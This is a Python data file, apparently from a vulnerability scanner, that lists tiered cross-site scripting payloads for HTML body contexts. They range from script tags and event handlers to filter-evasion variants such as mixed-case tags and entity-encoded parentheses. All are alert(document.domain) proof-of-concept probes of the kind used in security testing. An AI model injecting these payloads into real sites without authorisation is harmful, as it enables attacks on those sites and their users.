"""core/payloads/xss/html_body.py — HTML body context XSS payloads for wamiqsec/ReconMind."""

from typing import List, Dict, Any
Payload = Dict[str, Any]

TIER1: List[Payload] = [
    {"payload": "<svg onload=alert(document.domain)>", "tier": 1,
     "technique": "SVG onload", "requires": ["<"], "user_interaction": False},
    {"payload": "<img src=x onerror=alert(document.domain)>", "tier": 1,
     "technique": "img onerror", "requires": ["<"], "user_interaction": False},
    {"payload": "<script>alert(document.domain)</script>", "tier": 1,
     "technique": "Classic script tag", "requires": ["<"], "user_interaction": False},
]

TIER2: List[Payload] = [
    {"payload": "<details open ontoggle=alert(document.domain)>", "tier": 2,
     "technique": "HTML5 details ontoggle", "requires": ["<"], "user_interaction": False},
    {"payload": "<body onload=alert(document.domain)>", "tier": 2,
     "technique": "Body onload", "requires": ["<"], "user_interaction": False},
    {"payload": "<iframe srcdoc=<svg/onload=alert(document.domain)>>", "tier": 2,
     "technique": "iframe srcdoc bypass", "requires": ["<"], "user_interaction": False},
    {"payload": "<object data=javascript:alert(document.domain)>", "tier": 2,
     "technique": "object data javascript URI", "requires": ["<"], "user_interaction": False},
    {"payload": "<video><source onerror=alert(document.domain)>", "tier": 2,
     "technique": "video source onerror", "requires": ["<"], "user_interaction": False},
]

TIER3: List[Payload] = [
    {"payload": "<ScRiPt>alert(document.domain)</sCrIpT>", "tier": 3,
     "technique": "Mixed case script tag", "requires": ["<"], "user_interaction": False},
    {"payload": "<svg/onload=alert(document.domain)>", "tier": 3,
     "technique": "SVG slash separator", "requires": ["<"], "user_interaction": False},
    {"payload": "<svg><script>alert&#40;document.domain&#41;</script>", "tier": 3,
     "technique": "SVG namespace + entity parens", "requires": ["<"], "user_interaction": False},
    {"payload": "<input autofocus onfocus=alert(document.domain)>", "tier": 3,
     "technique": "Autofocus onfocus", "requires": ["<"], "user_interaction": False},
]
